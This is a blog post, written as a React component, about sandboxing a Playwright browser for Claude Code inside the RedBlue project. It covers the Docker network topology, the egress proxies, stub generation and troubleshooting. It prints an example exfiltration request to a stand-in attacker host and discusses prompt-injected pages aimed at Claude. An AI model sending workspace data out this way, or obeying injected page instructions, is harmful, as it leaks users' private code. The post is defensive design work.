import React from 'react';

function PlaywrightBlueZoneClaudeCode() {
  return (
    <>
      <p className="text-xl text-slate-400 leading-relaxed mb-8">
        The blue zone controls what Claude can see. A browser controls where what it sees can go. I added Playwright
        MCP to RedBlue so a sandboxed session can open the app it just built — but the browser runs in its own
        container, with no access to the code under review and no route to the internet except through a second
        default-deny proxy.
      </p>

      <div className="bg-gradient-to-r from-cyan-900/20 to-blue-900/20 border border-cyan-500/30 rounded-lg p-6 mb-8">
        <p className="text-cyan-300 font-semibold mb-2">GitHub Repository</p>
        <a
          href="https://github.com/matviyiv/RedBlue"
          target="_blank"
          rel="noopener noreferrer"
          className="text-blue-400 hover:text-blue-300 underline text-lg"
        >
          github.com/matviyiv/RedBlue
        </a>
        <p className="text-slate-400 text-sm mt-3">
          Everything in this post lives under <code className="text-cyan-300 bg-slate-800 px-1.5 py-0.5 rounded">claude-docker/</code> —
          the browser design is documented in <code className="text-cyan-300 bg-slate-800 px-1.5 py-0.5 rounded">docs/playwright-mcp.md</code>.
        </p>
      </div>

      <h2 className="text-3xl font-bold text-cyan-400 mt-12 mb-6">The Problem</h2>
      <p className="mb-6">
        RedBlue works because nothing in it has a network. The headless CI service runs with{' '}
        <code className="text-cyan-300 bg-slate-800 px-1.5 py-0.5 rounded">network_mode: none</code>. The interactive
        session reaches exactly two things through an allowlist proxy: Anthropic, and the package registries for
        dependency installs. That is the whole egress story, and it is short on purpose.
      </p>
      <p className="mb-6">
        Then I wanted Claude to check its own UI work. That means a browser — and a browser is a general-purpose HTTP
        client driven by the model. It can put arbitrary text into a URL, a query string, or a form post.
      </p>

      <div className="bg-red-900/20 border border-red-500/30 rounded-lg p-6 mb-8">
        <p className="text-red-300 font-semibold mb-3">One navigation is a complete exfiltration channel</p>
        <pre className="text-sm text-slate-300 leading-relaxed overflow-x-auto">{`GET https://attacker.example/?data=<file contents>`}</pre>
        <p className="text-slate-400 mt-3 text-sm">
          It looks exactly like an ordinary page load. Nothing in the session logs distinguishes it from Claude
          reading documentation.
        </p>
      </div>

      <p className="mb-6">
        So I did not treat the browser as a feature to add to the sandbox. I treated it as a second, separate sandbox
        with its own, much narrower egress policy, reachable only through a tool interface. It is off by default —
        a blue zone with no browser is the safer system, and nothing else in the tooling changes when it stays off.
      </p>

      <h2 className="text-3xl font-bold text-cyan-400 mt-12 mb-6">Why the Browser Lives Outside the Sandbox Image</h2>
      <p className="mb-6">
        The obvious implementation is <code className="text-cyan-300 bg-slate-800 px-1.5 py-0.5 rounded">npm install @playwright/mcp</code> inside
        the existing container. Three reasons not to, in order of how much they matter:
      </p>

      <div className="bg-slate-800/50 border border-cyan-500/30 rounded-lg p-6 mb-8">
        <ul className="space-y-4 text-slate-300">
          <li className="flex items-start">
            <span className="text-cyan-400 mr-3 mt-1">▹</span>
            <span>
              <strong className="text-cyan-300">A browser renders hostile content.</strong> Chromium is a large,
              fast-moving attack surface whose entire job is executing untrusted code from the internet. Put it in the
              same container as the code under review and a renderer compromise lands directly on top of the blue zone.
            </span>
          </li>
          <li className="flex items-start">
            <span className="text-cyan-400 mr-3 mt-1">▹</span>
            <span>
              <strong className="text-cyan-300">The blue zone is the thing worth stealing.</strong> The browser
              container mounts no part of <code className="text-cyan-300 bg-slate-800 px-1.5 py-0.5 rounded">/workspace</code> and
              receives no Anthropic credentials. A compromise there finds an empty container behind an allowlist proxy.
            </span>
          </li>
          <li className="flex items-start">
            <span className="text-cyan-400 mr-3 mt-1">▹</span>
            <span>
              <strong className="text-cyan-300">Image hygiene.</strong> The sandbox image is{' '}
              <code className="text-cyan-300 bg-slate-800 px-1.5 py-0.5 rounded">node:26-alpine</code> plus the Claude
              CLI — small, fast to build, easy to audit. A browser stack multiplies its size and pulls in a dependency
              tree that has nothing to do with reviewing code.
            </span>
          </li>
        </ul>
      </div>

      <p className="mb-6">
        Running the MCP server as a plain host process was considered and rejected. That hands the browser your host
        user's privileges, your filesystem, and your whole LAN, with nothing between the session and all of it but the
        MCP server's own argument parsing. A sibling container keeps the enforcement in Docker's networking, where it
        does not depend on the browser behaving.
      </p>

      <h2 className="text-3xl font-bold text-cyan-400 mt-12 mb-6">The Topology</h2>
      <p className="mb-6">
        Four containers, four networks, and every arrow below is the only path between those two boxes:
      </p>

      <div className="bg-gradient-to-r from-blue-900/20 to-purple-900/20 border border-blue-500/30 rounded-lg p-8 mb-8 font-mono text-sm overflow-x-auto">
        <pre className="text-slate-300 leading-relaxed">{`  claude-cli                          playwright-mcp
  +---------------------+             +----------------------+
  | Claude Code         |   MCP/HTTP  | @playwright/mcp      |
  | blue zone mounted   |------------>| + Chromium           |
  | Anthropic token     |  network:   | no mounts, no token  |
  | dev server :8080    |  browser    |                      |
  |   alias: devserver  |<------------|  --proxy-bypass      |
  +---------------------+   direct    +----------------------+
            |                                    |
            | network: egress                    | network: browser-egress
            v                                    v
  +---------------------+             +----------------------+
  | egress-proxy        |             | browser-proxy        |
  | Anthropic, npm      |             | generated allowlist  |
  +---------------------+             +----------------------+
            |                                    |
            +---------------+--------------------+
                            v
                       the internet`}</pre>
      </div>

      <p className="mb-6">
        The <code className="text-cyan-300 bg-slate-800 px-1.5 py-0.5 rounded">browser</code> network is{' '}
        <code className="text-cyan-300 bg-slate-800 px-1.5 py-0.5 rounded">internal: true</code> — no gateway — so the
        session gains no internet from the browser being there. And{' '}
        <code className="text-cyan-300 bg-slate-800 px-1.5 py-0.5 rounded">browser-proxy</code> is deliberately not
        attached to that network, so the session cannot use the browser's proxy directly as a general-purpose one.
      </p>

      <h3 className="text-2xl font-semibold text-blue-400 mt-8 mb-4">What each property buys, and how it is enforced</h3>

      <div className="bg-slate-900 border border-slate-700 rounded-lg p-6 mb-8 overflow-x-auto">
        <table className="w-full text-sm text-slate-300">
          <thead>
            <tr className="border-b border-slate-700">
              <th className="text-left py-3 pr-6 text-cyan-400 font-semibold">Property</th>
              <th className="text-left py-3 text-cyan-400 font-semibold">How it is enforced</th>
            </tr>
          </thead>
          <tbody>
            {[
              ['The session gains no internet from the browser', 'browser network is internal: true — no gateway'],
              ['The session cannot use the browser proxy directly', 'browser-proxy is not attached to the browser network'],
              ['The browser cannot reach anything off-allowlist', 'browser-egress is internal; browser-proxy is its only peer, default-deny'],
              ['The browser cannot read the code under review', 'no blue-zone volumes on playwright-mcp'],
              ['The browser cannot spend your Anthropic quota', 'CLAUDE_CODE_OAUTH_TOKEN is never passed to it'],
              ['Nothing survives the session', '--isolated, read_only: true, tmpfs-only writes, containers removed on exit'],
              ['CI never gets a browser', 'run-headless.sh keeps network_mode: none and says so if a browser is configured'],
            ].map((row, i) => (
              <tr key={i} className="border-b border-slate-800/50">
                <td className="py-3 pr-6 align-top">{row[0]}</td>
                <td className="py-3 align-top text-slate-400 font-mono text-xs">{row[1]}</td>
              </tr>
            ))}
          </tbody>
        </table>
      </div>

      <p className="mb-6">
        <strong className="text-cyan-300">browser-proxy is the boundary, and the only one:</strong> default-deny,
        exact-host regex, CONNECT limited to the configured https ports. The same list is also passed to the MCP
        server as <code className="text-cyan-300 bg-slate-800 px-1.5 py-0.5 rounded">--allowed-origins</code>, but
        upstream is explicit that this "does not serve as a security boundary and does not affect redirects". It makes
        an obvious mistake fail early and clearly; it is not something to rely on. If you are reasoning about what the
        browser can reach, reason about the proxy.
      </p>

      <h2 className="text-3xl font-bold text-cyan-400 mt-12 mb-6">Configuring It</h2>
      <p className="mb-6">
        Nothing about the browser is hand-edited. The containers, the proxy config, and the MCP config are all
        generated from one section of <code className="text-cyan-300 bg-slate-800 px-1.5 py-0.5 rounded">blue-zone.config.sh</code>:
      </p>

      <div className="bg-slate-900 border border-slate-700 rounded-lg p-6 mb-8 overflow-x-auto">
        <p className="text-slate-500 text-xs mb-3">blue-zone.config.sh</p>
        <pre className="text-sm text-slate-300 leading-relaxed">{`BLUE_ZONE_BROWSER_ENABLED=1

BLUE_ZONE_BROWSER_ORIGINS=(
  http://host.docker.internal:8081     # a dev server on your machine
  https://staging.example.com          # a staging deployment
)

# Required before any host.docker.internal origin is accepted.
BLUE_ZONE_BROWSER_ALLOW_HOST_GATEWAY=1`}</pre>
      </div>

      <p className="mb-6">
        Rules the tooling enforces before any container starts — in{' '}
        <code className="text-cyan-300 bg-slate-800 px-1.5 py-0.5 rounded">validate-blue-zone.sh</code> check 7, and
        again in <code className="text-cyan-300 bg-slate-800 px-1.5 py-0.5 rounded">start-cli.sh</code> because those
        variables can be overridden per-run from the environment:
      </p>

      <div className="bg-slate-800/50 border border-cyan-500/30 rounded-lg p-6 mb-8">
        <ul className="space-y-3 text-slate-300">
          {[
            'Enabled with an empty origin list is a violation, not a silent no-op',
            'Each origin must parse exactly as scheme://host[:port] — no path, no query, no credentials',
            'Wildcards and regex metacharacters are refused: they widen the allowlist silently once they reach the proxy filter, which is itself a regex',
            'host.docker.internal requires BLUE_ZONE_BROWSER_ALLOW_HOST_GATEWAY=1',
            'Private and LAN addresses (10.x, 192.168.x, *.local, localhost) require BLUE_ZONE_BROWSER_ALLOW_PRIVATE_IPS=1',
            'Plaintext http:// to a public host is a warning',
          ].map((item, i) => (
            <li key={i} className="flex items-start">
              <span className="text-cyan-400 mr-3 mt-1">▹</span>
              <span>{item}</span>
            </li>
          ))}
        </ul>
      </div>

      <p className="mb-6">
        Anything that does not parse exactly cannot be enforced exactly, so it is refused. And host access, when you
        enable it, is granted to the <em>proxy</em> — not to the browser. The browser still has no host route of its
        own; it has to go through the allowlist to get there.
      </p>

      <h2 className="text-3xl font-bold text-cyan-400 mt-12 mb-6">The Tightest Configuration: a Dev Server Claude Runs Itself</h2>
      <p className="mb-6">
        The case I actually wanted: Claude edits the UI, starts the project's dev server inside the sandbox, and opens
        it in the browser to see whether the change worked. Here is the whole configuration for that:
      </p>

      <div className="bg-slate-900 border border-slate-700 rounded-lg p-6 mb-8 overflow-x-auto">
        <p className="text-slate-500 text-xs mb-3">blue-zone.config.sh</p>
        <pre className="text-sm text-slate-300 leading-relaxed">{`BLUE_ZONE_BROWSER_ENABLED=1
BLUE_ZONE_BROWSER_DEV_PORTS=(8080)
BLUE_ZONE_BROWSER_ORIGINS=()          # nothing external needed`}</pre>
      </div>

      <p className="mb-6">
        <code className="text-cyan-300 bg-slate-800 px-1.5 py-0.5 rounded">BLUE_ZONE_BROWSER_ALLOW_HOST_GATEWAY</code> stays
        at <code className="text-cyan-300 bg-slate-800 px-1.5 py-0.5 rounded">0</code>: nothing here touches my machine.
        This is the tightest way to use the browser, not a loosening of it. The dev server is in the sandbox, the
        browser is in the sandbox, and the traffic between them never leaves the internal Docker networks. With no
        external origins the proxy allowlist is empty, so every destination outside Docker is denied.
      </p>

      <h3 className="text-2xl font-semibold text-blue-400 mt-8 mb-4">Why it needs its own mechanism</h3>
      <p className="mb-6">
        Here is the wrinkle. <code className="text-cyan-300 bg-slate-800 px-1.5 py-0.5 rounded">browser-proxy</code> is
        deliberately not on the <code className="text-cyan-300 bg-slate-800 px-1.5 py-0.5 rounded">browser</code> network
        — that is precisely what stops the session using it as a general-purpose proxy. The same fact means it could
        never route to <code className="text-cyan-300 bg-slate-800 px-1.5 py-0.5 rounded">claude-cli</code> either, so a
        dev server inside the session is unreachable <em>through</em> the proxy, by construction.
      </p>
      <p className="mb-6">Two pieces close that gap, and neither widens the browser's reach:</p>

      <div className="bg-slate-800/50 border border-cyan-500/30 rounded-lg p-6 mb-8">
        <ul className="space-y-4 text-slate-300">
          <li className="flex items-start">
            <span className="text-cyan-400 mr-3 mt-1">▹</span>
            <span>
              <strong className="text-cyan-300">A network alias.</strong>{' '}
              <code className="text-cyan-300 bg-slate-800 px-1.5 py-0.5 rounded">claude-cli</code> gets the name{' '}
              <code className="text-cyan-300 bg-slate-800 px-1.5 py-0.5 rounded">devserver</code> on the{' '}
              <code className="text-cyan-300 bg-slate-800 px-1.5 py-0.5 rounded">browser</code> network, which only it
              and the browser container share. <code className="text-cyan-300 bg-slate-800 px-1.5 py-0.5 rounded">start-cli.sh</code> adds{' '}
              <code className="text-cyan-300 bg-slate-800 px-1.5 py-0.5 rounded">--use-aliases</code> to the compose
              run, because compose does not apply a service's aliases to a{' '}
              <code className="text-cyan-300 bg-slate-800 px-1.5 py-0.5 rounded">run</code> container otherwise —
              without it the name simply would not resolve.
            </span>
          </li>
          <li className="flex items-start">
            <span className="text-cyan-400 mr-3 mt-1">▹</span>
            <span>
              <strong className="text-cyan-300">A proxy bypass.</strong> Chromium is given{' '}
              <code className="text-cyan-300 bg-slate-800 px-1.5 py-0.5 rounded">--proxy-bypass=devserver</code> so
              requests to that name go direct across the internal network instead of to a proxy that cannot reach it.
              The origin is also added to <code className="text-cyan-300 bg-slate-800 px-1.5 py-0.5 rounded">--allowed-origins</code>,
              so the app-layer check still applies.
            </span>
          </li>
        </ul>
      </div>

      <p className="mb-6">
        The bypass grants nothing new: that path already existed at the network layer, and it leads to the session's
        own container.
      </p>

      <h3 className="text-2xl font-semibold text-blue-400 mt-8 mb-4">Two settings Claude gets wrong every time</h3>
      <p className="mb-6">
        These are the cause of a failure to load almost always, so{' '}
        <code className="text-cyan-300 bg-slate-800 px-1.5 py-0.5 rounded">ai-scripts/CLAUDE.md</code> states both
        explicitly:
      </p>

      <div className="bg-slate-900 border border-slate-700 rounded-lg p-6 mb-8 overflow-x-auto">
        <pre className="text-sm text-slate-300 leading-relaxed">{`# 1. Bind to 0.0.0.0 — the browser is in a DIFFERENT container.
#    A server on localhost is reachable only from inside claude-cli.
npx webpack serve --host 0.0.0.0 --port 8080

# 2. Allow the 'devserver' hostname — dev servers reject requests
#    with an unrecognised Host header.
#      webpack-dev-server:  devServer: { allowedHosts: 'all' }
#      vite:                server.allowedHosts

# Then open http://devserver:8080  —  NOT http://localhost:8080,
# which resolves to the browser's own container.`}</pre>
      </div>

      <p className="mb-6">
        The tooling cannot check any of this before the session: nothing is listening yet when validation runs, and
        the server is started later by Claude. What validation does check is that the ports are numbers in range and
        the alias is a usable hostname. The rest is a runtime symptom with two likely causes — so the session is told
        the exact origin at startup via{' '}
        <code className="text-cyan-300 bg-slate-800 px-1.5 py-0.5 rounded">--append-system-prompt</code>, because
        CLAUDE.md can explain the workflow but cannot know your port number.
      </p>

      <h2 className="text-3xl font-bold text-cyan-400 mt-12 mb-6">Stubs: Making a Filtered Repo Actually Build</h2>
      <p className="mb-6">
        Here is where it got interesting. The blue zone strips every{' '}
        <code className="text-cyan-300 bg-slate-800 px-1.5 py-0.5 rounded">*-api.ts</code>,{' '}
        <code className="text-cyan-300 bg-slate-800 px-1.5 py-0.5 rounded">*Service.ts</code>,{' '}
        <code className="text-cyan-300 bg-slate-800 px-1.5 py-0.5 rounded">*Client.ts</code>, and the whole{' '}
        <code className="text-cyan-300 bg-slate-800 px-1.5 py-0.5 rounded">api/</code> and{' '}
        <code className="text-cyan-300 bg-slate-800 px-1.5 py-0.5 rounded">services/</code> directories. That is the
        point — those files carry endpoints and server details. But a React app whose components import a module that
        does not exist does not render. It does not even bundle. Webpack stops at the first unresolved import, and the
        browser I just spent all this effort isolating has nothing to open.
      </p>
      <p className="mb-6">
        So I asked Claude to generate stubs for the missing files. It has exactly what it needs to do that well:
      </p>

      <div className="bg-slate-800/50 border border-cyan-500/30 rounded-lg p-6 mb-8">
        <ul className="space-y-4 text-slate-300">
          <li className="flex items-start">
            <span className="text-cyan-400 mr-3 mt-1">▹</span>
            <span>
              <strong className="text-cyan-300">BLUE_ZONE_MANIFEST.md</strong> — an auto-generated, read-only
              inventory mounted at the workspace root, listing every file that was stripped and the rule that removed
              it. Claude knows precisely which modules are supposed to exist, without ever seeing a byte of their
              contents.
            </span>
          </li>
          <li className="flex items-start">
            <span className="text-cyan-400 mr-3 mt-1">▹</span>
            <span>
              <strong className="text-cyan-300">src/types/</strong> — the interface-only contract layer that stays in
              the blue zone. No implementation, no URLs, no secret reads. Claude can see the <em>shape</em> of the API
              without seeing how it is built or where it points.
            </span>
          </li>
        </ul>
      </div>

      <p className="mb-6">
        The manifest says <code className="text-cyan-300 bg-slate-800 px-1.5 py-0.5 rounded">src/api/auth-api.ts</code> exists
        and is red zone. The contract says what it must satisfy. The stub writes itself:
      </p>

      <div className="bg-slate-900 border border-slate-700 rounded-lg p-6 mb-8 overflow-x-auto">
        <p className="text-slate-500 text-xs mb-3">src/types/auth.types.ts — blue zone, the contract</p>
        <pre className="text-sm text-slate-300 leading-relaxed">{`// Function signature contract — implementation lives in the red zone.
export interface IAuthApi {
  login(request: LoginRequest): Promise<LoginResponse>;
  logout(): Promise<void>;
}`}</pre>
      </div>

      <div className="bg-slate-900 border border-slate-700 rounded-lg p-6 mb-8 overflow-x-auto">
        <p className="text-slate-500 text-xs mb-3">src/api/auth-api.ts — generated stub, never leaves the sandbox</p>
        <pre className="text-sm text-slate-300 leading-relaxed">{`import type { IAuthApi, LoginRequest, LoginResponse } from '../types';

// STUB. Satisfies the contract so the bundle compiles and the dev
// server boots. No endpoint, no token, no network.
export const authApi: IAuthApi = {
  async login(request: LoginRequest): Promise<LoginResponse> {
    return {
      userId: 'stub-user-1',
      accessToken: 'stub-access-token',
      refreshToken: 'stub-refresh-token',
      expiresAt: Date.now() + 3600_000,
    };
  },
  async logout(): Promise<void> {},
};`}</pre>
      </div>

      <h3 className="text-2xl font-semibold text-blue-400 mt-8 mb-4">Why the stubs cannot contaminate the repo</h3>
      <p className="mb-6">
        This is the part that makes the whole approach safe rather than merely convenient.{' '}
        <code className="text-cyan-300 bg-slate-800 px-1.5 py-0.5 rounded">sync-back.sh</code> re-checks every path
        against the red-zone rules before exporting anything. A stub at{' '}
        <code className="text-cyan-300 bg-slate-800 px-1.5 py-0.5 rounded">src/api/auth-api.ts</code> matches the same{' '}
        <code className="text-cyan-300 bg-slate-800 px-1.5 py-0.5 rounded">api/</code> rule that stripped the real file,
        so it is blocked:
      </p>

      <div className="bg-slate-900 border border-slate-700 rounded-lg p-6 mb-8 overflow-x-auto">
        <pre className="text-sm text-slate-300 leading-relaxed">{`  ! blocked  src/api/auth-api.ts (matches a red-zone rule)
  ! blocked  src/services/jitsiService.ts (collides with a red-zone file — left untouched)
  ~ merged   src/screens/HomeScreen.tsx
  + added    src/components/LoginForm.tsx`}</pre>
      </div>

      <p className="mb-6">
        The same filter that defines the red zone on the way in defends it on the way out. Stubs are disposable by
        construction — they live for the length of a session and die with the container, and my real implementation is
        never at risk of being overwritten by a fabricated one. I did not design this for stubs; it fell out of the
        rule being applied in both directions.
      </p>

      <h3 className="text-2xl font-semibold text-blue-400 mt-8 mb-4">What this actually opens up</h3>
      <p className="mb-6">
        With stubs plus a browser, a blue-zone session stops being a review seat and becomes a development loop:
      </p>

      <div className="bg-gradient-to-r from-cyan-900/20 to-blue-900/20 border border-cyan-500/30 rounded-lg p-6 mb-8">
        <ul className="space-y-3 text-slate-300">
          {[
            'Claude implements a UI change against the type contracts',
            'Generates or updates stubs for whatever red-zone modules the change touches',
            'Runs webpack on 0.0.0.0:8080 inside the sandbox',
            'Opens http://devserver:8080 in a Chromium that cannot reach anything else',
            'Takes a snapshot, clicks through the flow, reads back what rendered',
            'Fixes what it sees is broken — then runs change-reviewer before declaring done',
          ].map((item, i) => (
            <li key={i} className="flex items-start">
              <span className="text-cyan-400 mr-3 mt-1">▹</span>
              <span>{item}</span>
            </li>
          ))}
        </ul>
      </div>

      <p className="mb-6">
        That loop closes entirely inside Docker. No host route, no egress, no allowlist involved — the traffic never
        leaves the internal network. The model verifies its own work instead of handing me a diff and a claim that it
        should render correctly.
      </p>

      <h2 className="text-3xl font-bold text-cyan-400 mt-12 mb-6">The Hard Part</h2>
      <p className="mb-6">
        Every one of these cost real time, and every one reported itself as something it was not.
      </p>

      <h3 className="text-2xl font-semibold text-blue-400 mt-8 mb-4">"Playwright MCP Server — needs authentication"</h3>
      <div className="bg-slate-900 border border-slate-700 rounded-lg p-6 mb-8 overflow-x-auto">
        <pre className="text-sm text-slate-300 leading-relaxed">{`SDK auth failed: Dynamic Client Registration rejected (HTTP 403):
  <title>403 Filtered</title> ... Generated by tinyproxy version 1.11.2.`}</pre>
      </div>
      <p className="mb-6">
        This is not an authentication problem. Read whose 403 it is — tinyproxy, the session's own{' '}
        <code className="text-cyan-300 bg-slate-800 px-1.5 py-0.5 rounded">egress-proxy</code>.{' '}
        <code className="text-cyan-300 bg-slate-800 px-1.5 py-0.5 rounded">claude-cli</code> runs with{' '}
        <code className="text-cyan-300 bg-slate-800 px-1.5 py-0.5 rounded">HTTP_PROXY</code> pointed at that proxy, so
        unless the MCP host is exempted, the request to{' '}
        <code className="text-cyan-300 bg-slate-800 px-1.5 py-0.5 rounded">http://playwright-mcp:8931/mcp</code> is
        handed to a proxy that is not even on the browser network. It default-denies the unknown host and returns{' '}
        <code className="text-cyan-300 bg-slate-800 px-1.5 py-0.5 rounded">403 Filtered</code> — and an MCP client
        reasonably reads a 403 from an HTTP endpoint as an auth challenge, tries Dynamic Client Registration, gets the
        same 403, and reports "needs authentication".
      </p>
      <p className="mb-6">The fix is a generated NO_PROXY exemption:</p>
      <div className="bg-slate-900 border border-slate-700 rounded-lg p-6 mb-8 overflow-x-auto">
        <p className="text-slate-500 text-xs mb-3">docker-compose.browser.yml (generated)</p>
        <pre className="text-sm text-slate-300 leading-relaxed">{`environment:
  NO_PROXY: "localhost,127.0.0.1,playwright-mcp,devserver"`}</pre>
      </div>
      <p className="mb-6">
        Every other proxy variable is left alone, so Anthropic traffic still goes through the allowlist. The general
        shape is worth remembering: a <code className="text-cyan-300 bg-slate-800 px-1.5 py-0.5 rounded">403 Filtered</code> page
        always means a proxy refused a host, never that a server wants credentials.
      </p>

      <h3 className="text-2xl font-semibold text-blue-400 mt-8 mb-4">406 Not Acceptable — reported, again, as an auth failure</h3>
      <p className="mb-6">
        Despite the wording this one is good news: the body is a reply <em>from the MCP server</em>, so the proxy
        exemption and the host check are both working and the two are talking. It is a client bug, not a configuration
        problem. The MCP Streamable HTTP spec requires clients to send{' '}
        <code className="text-cyan-300 bg-slate-800 px-1.5 py-0.5 rounded">Accept: application/json, text/event-stream</code>;
        Claude Code's HTTP transport does not, and a spec-compliant server — which{' '}
        <code className="text-cyan-300 bg-slate-800 px-1.5 py-0.5 rounded">@playwright/mcp</code> is — answers 406.
      </p>
      <div className="bg-slate-900 border border-slate-700 rounded-lg p-6 mb-8 overflow-x-auto">
        <pre className="text-sm text-slate-300 leading-relaxed">{`BLUE_ZONE_BROWSER_MCP_TRANSPORT=sse    # default: /sse  — works today
BLUE_ZONE_BROWSER_MCP_TRANSPORT=http   #          /mcp  — switch once the client lands`}</pre>
      </div>
      <p className="mb-6">
        The same container serves the older SSE endpoint, which Claude Code speaks correctly, so that is the default.
        Nothing about the container changes; only which endpoint the generated{' '}
        <code className="text-cyan-300 bg-slate-800 px-1.5 py-0.5 rounded">.mcp.json</code> points at.
      </p>

      <h3 className="text-2xl font-semibold text-blue-400 mt-8 mb-4">"403 Access is only allowed at localhost:8931"</h3>
      <p className="mb-6">
        Also surfaced as an auth failure, but this 403 comes from the MCP server itself — read the body.{' '}
        <code className="text-cyan-300 bg-slate-800 px-1.5 py-0.5 rounded">@playwright/mcp</code> has DNS-rebinding
        protection and serves only requests whose Host header it recognises. The fix names both forms deliberately:
      </p>
      <div className="bg-slate-900 border border-slate-700 rounded-lg p-6 mb-8 overflow-x-auto">
        <pre className="text-sm text-slate-300 leading-relaxed">{`--allowed-hosts=playwright-mcp:8931,playwright-mcp`}</pre>
      </div>
      <p className="mb-6">
        The README describes this as a list of hosts, but the refusal echoes entries verbatim and the default one
        carries the port, so the comparison is against the whole Host header. Passing the bare name was still refused.
        Listing both matches whichever way a given version compares. Do <strong>not</strong> use{' '}
        <code className="text-cyan-300 bg-slate-800 px-1.5 py-0.5 rounded">--allowed-hosts "*"</code>, which appears in
        a lot of advice online — that turns the DNS-rebinding check off altogether.
      </p>

      <h3 className="text-2xl font-semibold text-blue-400 mt-8 mb-4">"Executable doesn't exist at /ms-playwright/chromium-XXXX/"</h3>
      <p className="mb-6">
        The Chromium build revision the bundled Playwright wants is not the one in the image.{' '}
        <code className="text-cyan-300 bg-slate-800 px-1.5 py-0.5 rounded">@playwright/mcp</code> pins an exact
        Playwright version (0.0.81 pins a 1.64.0-alpha), and Playwright resolves browsers by build revision, not by
        "whatever Chromium is present" — so it does not follow the base image's own Playwright version. Pinning the
        base image to a matching tag is a losing game, because the pairing changes on every MCP release.
      </p>
      <div className="bg-slate-900 border border-slate-700 rounded-lg p-6 mb-8 overflow-x-auto">
        <p className="text-slate-500 text-xs mb-3">ai-playwright/Dockerfile</p>
        <pre className="text-sm text-slate-300 leading-relaxed">{`RUN npm install -g --ignore-scripts "@playwright/mcp@\${PLAYWRIGHT_MCP_VERSION}" \\
    && node "$(npm root -g)/@playwright/mcp/node_modules/playwright-core/cli.js" \\
       install chromium \\
    && chmod -R a+rX /ms-playwright

# Fail at BUILD time if the entrypoint is not what we think it is.
RUN command -v playwright-mcp >/dev/null || { echo "FATAL: ..."; exit 1; }`}</pre>
      </div>
      <p className="mb-6">
        Installing through the MCP package's <em>own</em> playwright-core means the browser is by construction the one
        that version expects, whatever either version is. The base image is left doing what it is good at: OS
        libraries, fonts, and the non-root <code className="text-cyan-300 bg-slate-800 px-1.5 py-0.5 rounded">pwuser</code> account.
      </p>
      <p className="mb-6">
        The build-time entrypoint check exists because an earlier version of the Dockerfile guessed the binary name
        wrong (<code className="text-cyan-300 bg-slate-800 px-1.5 py-0.5 rounded">mcp-server-playwright</code> instead
        of <code className="text-cyan-300 bg-slate-800 px-1.5 py-0.5 rounded">playwright-mcp</code>), and the only
        symptom was a container exiting with "no such file or directory" — which says nothing about the cause. A build
        that cannot start its own entrypoint should never produce an image.
      </p>

      <h3 className="text-2xl font-semibold text-blue-400 mt-8 mb-4">ERR_BLOCKED_BY_CLIENT navigating to the dev server</h3>
      <p className="mb-6">
        Note first what this is not: a proxy refusal arrives as a tinyproxy 403 page.{' '}
        <code className="text-cyan-300 bg-slate-800 px-1.5 py-0.5 rounded">ERR_BLOCKED_BY_CLIENT</code> is Chromium
        refusing to make the request at all, which here means{' '}
        <code className="text-cyan-300 bg-slate-800 px-1.5 py-0.5 rounded">--allowed-origins</code> did not list it.
        Two causes, and the error names neither: the URL used{' '}
        <code className="text-cyan-300 bg-slate-800 px-1.5 py-0.5 rounded">localhost</code> (which inside the browser
        container is the browser), or the port is not in{' '}
        <code className="text-cyan-300 bg-slate-800 px-1.5 py-0.5 rounded">BLUE_ZONE_BROWSER_DEV_PORTS</code>. The
        session banner prints every reachable origin before Claude starts — if the port you expect is not on that list,
        fix the config rather than the URL.
      </p>

      <h2 className="text-3xl font-bold text-cyan-400 mt-12 mb-6">What This Does NOT Protect Against</h2>
      <p className="mb-6">
        Stated plainly, because a control you believe in wrongly is worse than one you know you lack.
      </p>

      <div className="bg-red-900/20 border border-red-500/30 rounded-lg p-6 mb-8">
        <ul className="space-y-4 text-slate-300">
          {[
            ['Exfiltration to an allowed origin', 'If https://staging.example.com is on the list, Claude can put workspace content into a request to it. The allowlist bounds where, not what. Keep the list short, and keep it to origins you control.'],
            ['Host-granular, not port-granular, filtering for plain HTTP', 'tinyproxy matches the destination host. ConnectPort bounds https tunnels to the configured ports, but an http:// origin effectively allows that host on any port.'],
            ['A prompt-injected page', 'A page the browser visits can contain instructions aimed at Claude. The allowlist limits where those instructions can send anything, and CLAUDE.md tells Claude not to put workspace content into requests — but that is guidance, not enforcement. This is a large part of why the browser is interactive-only: a human approves each action.'],
            ['--no-sandbox', "Chromium's own sandbox needs user namespaces that Docker's default seccomp profile blocks, so it is disabled and container isolation is the boundary instead: non-root pwuser, all capabilities dropped, no-new-privileges, a read-only root filesystem, memory and pid limits, and no mounts worth reaching."],
            ['Loopback inside the browser container', "The MCP server's own port is reachable from a page as localhost:8931; --allowed-origins is what keeps a page from requesting it."],
            ['Supply chain', 'The image tag and MCP version default to exact pins, not latest. Prefer a digest for the base image before any real use. The MCP package is installed with --ignore-scripts.'],
          ].map((row, i) => (
            <li key={i} className="flex items-start">
              <span className="text-red-400 mr-3 mt-1">✗</span>
              <span>
                <strong className="text-red-300">{row[0]}.</strong> {row[1]}
              </span>
            </li>
          ))}
        </ul>
      </div>

      <p className="mb-6">
        Every browser action prompts for approval by default.{' '}
        <code className="text-cyan-300 bg-slate-800 px-1.5 py-0.5 rounded">BLUE_ZONE_BROWSER_TOOLS</code> can
        pre-approve a narrow set — navigate plus snapshot, say — if the prompting gets in the way, but leaving it empty
        is the safer setting, and it is the reason this is interactive-only. The headless CI path never gets a browser
        at all: <code className="text-cyan-300 bg-slate-800 px-1.5 py-0.5 rounded">run-headless.sh</code> keeps{' '}
        <code className="text-cyan-300 bg-slate-800 px-1.5 py-0.5 rounded">network_mode: none</code> and says so if one
        is configured.
      </p>

      <h2 className="text-3xl font-bold text-cyan-400 mt-12 mb-6">Lessons Learned</h2>

      <div className="space-y-6 mb-8">
        <div className="border-l-4 border-cyan-500 pl-6 py-2">
          <p className="text-cyan-300 font-semibold mb-2">Name the one control that is actually the boundary</p>
          <p className="text-slate-400">
            Two things look like an allowlist here. Only the proxy is enforcement;{' '}
            <code className="text-cyan-300 bg-slate-800 px-1.5 py-0.5 rounded">--allowed-origins</code> is a fast, clear
            failure. Writing down which is which stopped me from reasoning about reachability using the wrong one.
          </p>
        </div>

        <div className="border-l-4 border-blue-500 pl-6 py-2">
          <p className="text-blue-300 font-semibold mb-2">Generate every policy file, hand-edit none</p>
          <p className="text-slate-400">
            The proxy filter, the tinyproxy config, the MCP config, and the compose overlay are all written from one
            config section on every run. A policy edit takes effect on the next session and a stale one never lingers.
          </p>
        </div>

